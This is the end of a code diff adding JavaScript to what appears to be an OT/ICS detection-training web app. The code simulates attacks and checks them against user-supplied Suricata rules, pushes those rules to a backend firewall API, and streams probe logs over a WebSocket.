+  finishAttack(atk, sig);
+}
+
+function finishAttack(atk, sig) {
+  const btn = document.getElementById('btn-launch');
+
+  // Trigger detection on blue side
+  atk.probes.forEach(probe => {
+    appendLog(probe, `\n<span class="log-ts">${ts()}</span>`);
+    appendLog(probe, `<span class="log-info">[capture] ${atk.proto} traffic — ${atk.name}</span>`);
+  });
+
+  sig.alerts.forEach((alert, i) => {
+    setTimeout(() => {
+      const probe = sig.probe;
+      const rules = injectedRules[probe] || [];
+      const matched = rules.some(r =>
+        r.sid === alert.sid || r.msg === alert.msg ||
+        (r.content && alert.msg.toLowerCase().includes(r.content.toLowerCase()))
+      );
+
+      if (matched) {
+        appendLog(probe, `<span class="log-alert">${ts()} [**] [1:${alert.sid}:1] ${alert.msg} [**] [Priority: 1]</span>`);
+        appendLog(probe, `<span class="log-ok">  ✓ DETECTED by rule SID:${alert.sid}</span>`);
+      } else {
+        appendLog(probe, `<span class="log-ts">${ts()} [traffic] ${atk.proto} packet — no matching rule</span>`);
+        appendLog(probe, `<span style="color:var(--orange)">  ✗ MISSED — no rule for: ${alert.msg}</span>`);
+      }
+
+      if (i === sig.alerts.length - 1) {
+        setTimeout(() => {
+          attackRunning = false;
+          btn.disabled = false;
+          btn.textContent = `Execute: ${ATTACKS.find(a=>a.id===selectedAttack).name}`;
+          appendLog(probe, `<span class="log-ts">${ts()} [end] Attack complete</span>`);
+        }, 200);
+      }
+    }, 400 * (i + 1));
+  });
+}
+
+
+// ====== Rules ======
+async function injectRules(probe) {
+  const textarea = document.getElementById('rules-' + probe);
+  const text = textarea.value.trim();
+  if (!text) return;
+
+  const rules = parseRules(text);
+  injectedRules[probe] = rules;
+
+  if (connectedMode) {
+    // Push to NGFW via API
+    try {
+      const r = await fetch(API_BASE + '/api/suricata/rules', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ probe, rules: text }),
+      });
+      const data = await r.json();
+      appendLog(probe, `\n<span class="log-ok">[suricata] ${data.rules_count} rule(s) pushed to NGFW — ${data.status}</span>`);
+      if (data.errors.length) data.errors.forEach(e => appendLog(probe, `<span class="warn">  ${e}</span>`));
+    } catch (e) {
+      appendLog(probe, `\n<span class="warn">[!] API error: ${e.message} — rules loaded locally only</span>`);
+    }
+  }
+
+  appendLog(probe, `\n<span class="log-ts">${ts()}</span>`);
+  appendLog(probe, `<span class="log-ok">[suricata] ${rules.length} rule(s) injected</span>`);
+  rules.forEach(r => appendLog(probe, `<span class="log-info">  SID:${r.sid} — ${r.msg}</span>`));
+}
+
+function parseRules(text) {
+  const rules = [];
+  for (const line of text.split('\n')) {
+    const t = line.trim();
+    if (!t || t.startsWith('#')) continue;
+    const sidM = t.match(/sid\s*:\s*(\d+)/);
+    const msgM = t.match(/msg\s*:\s*"([^"]+)"/);
+    const cntM = t.match(/content\s*:\s*(?:"([^"]+)"|(\|[^|]+\|))/);
+    rules.push({
+      sid: sidM ? parseInt(sidM[1]) : Math.floor(Math.random() * 9000 + 1000),
+      msg: msgM ? msgM[1] : 'Unnamed rule',
+      content: cntM ? (cntM[1] || cntM[2]) : null,
+    });
+  }
+  return rules;
+}
+
+function clearRules(probe) {
+  document.getElementById('rules-' + probe).value = '';
+  injectedRules[probe] = [];
+  appendLog(probe, `\n<span class="log-info">[suricata] All rules cleared — 0 active</span>`);
+}
+
+function clearLog(probe) {
+  const el = document.getElementById('log-' + probe);
+  el.innerHTML = `<span class="log-info">[suricata] Log cleared</span>\n<span class="log-ts">Waiting for traffic...</span>`;
+}
+
+function clearOida() {
+  document.getElementById('oida-term').innerHTML =
+    `<span class="dim">$ oida --version\nOIDA v0.4.2 — OT/ICS Dynamic Assessment Framework\nWaiting for command...</span>`;
+}
+
+
+// ====== WebSocket log streaming (connected mode) ======
+function connectLogStream(probe) {
+  if (!connectedMode) return;
+  if (logWebSockets[probe]) logWebSockets[probe].close();
+
+  const wsUrl = API_BASE.replace(/^http/, 'ws') + '/ws/logs/' + probe;
+  const ws = new WebSocket(wsUrl);
+  ws.onmessage = (e) => appendLog(probe, e.data);
+  ws.onerror = () => appendLog(probe, `<span class="warn">[ws] Connection error</span>`);
+  ws.onclose = () => {
+    appendLog(probe, `<span class="log-ts">[ws] Disconnected</span>`);
+    // Reconnect after 5s
+    setTimeout(() => { if (connectedMode) connectLogStream(probe); }, 5000);
+  };
+  logWebSockets[probe] = ws;
+}
+
+
+// ====== Helpers ======
+function appendLog(probe, html) {
+  const el = document.getElementById('log-' + probe);
+  el.innerHTML += '\n' + html;
+  el.scrollTop = el.scrollHeight;
+}
+
+function ts() {
+  const d = new Date();
+  return d.toTimeString().slice(0,8) + '.' + String(d.getMilliseconds()).padStart(3,'0');
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function switchProbe(probe) {
+  document.querySelectorAll('.probe-tab').forEach(t =>
+    t.classList.toggle('active', t.dataset.probe === probe));
+  document.querySelectorAll('.probe-panel').forEach(p =>
+    p.classList.toggle('active', p.id === 'panel-' + probe));
+}
+
+function updateClock() {
+  document.getElementById('ts-clock').textContent = new Date().toTimeString().slice(0,8);
+}
+
+
+// ====== Init ======
+renderAttacks();
+updateClock();
+setInterval(updateClock, 1000);
+// Try connecting to backend on load
+setTimeout(checkBackend, 500);
+</script>
